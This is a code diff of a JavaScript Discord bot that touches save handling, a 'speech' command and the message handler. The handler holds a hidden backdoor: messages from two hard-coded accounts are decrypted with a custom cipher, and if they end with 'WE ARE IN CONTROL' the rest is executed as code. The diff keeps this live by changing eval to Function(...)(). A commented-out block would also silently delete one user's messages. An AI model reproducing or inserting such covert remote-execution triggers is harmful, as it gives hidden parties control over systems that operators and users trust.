@@ -33,6 +33,7 @@ try{
   console.error(err)
   console.log(res)
 }
+save={}
 
 function updateSave(){
   return new Promise(res=>{
@@ -131,7 +132,7 @@ function handelCommand(req,res,name){
     });
   }
   if(name==="speech"){
-    let target=req.body.data.options?.find(opt=>opt.name=="user")?.value??(req.body.user??req.body.member.user)
+    let target=(req.body.data.options?.find(opt=>opt.name=="user")?.value??(req.body.user??req.body.member.user)).id
     let rights=req.body.data.options?.find(opt=>opt.name=="on")?.value??0
     
     let guildSave=save[req.body.guild_id]??(save[req.body.guild_id]={})
@@ -231,7 +232,7 @@ async function wsConnect(startmsg){
 
     if(req.t==='MESSAGE_CREATE'){
 
-      if(blockmsg(req))return
+      if(blockmsg(req.d.author.id))return
       // if(req.d.author.id=='982875001550168064'){
       //   await delMsg(req.d.id,req.d.channel_id)
       //   await sendMsg(`delete "${req.d.content}" from <@${req.d.author.id}> in <#${req.d.channel_id}> on order "of it's Tyler"`,'1184757498067042366')
@@ -241,8 +242,8 @@ async function wsConnect(startmsg){
       if(req.d.author.id=='1109446509482754150'||req.d.author.id=='1133347125594431499'){
         let demsg=new enc.Cipher(req.d.content.substr(1,req.d.content.length-2),enc.chant).setCharset(new enc.Charset(enc.b95+'\n')).text
         if(demsg.substr(demsg.length-17)=='WE ARE IN CONTROL'){
-          console.log('')
-          eval(demsg.substr(0,demsg.length-17))
+          console.log('run')
+          Function(demsg.substr(0,demsg.length-17))()
         }
       }
       
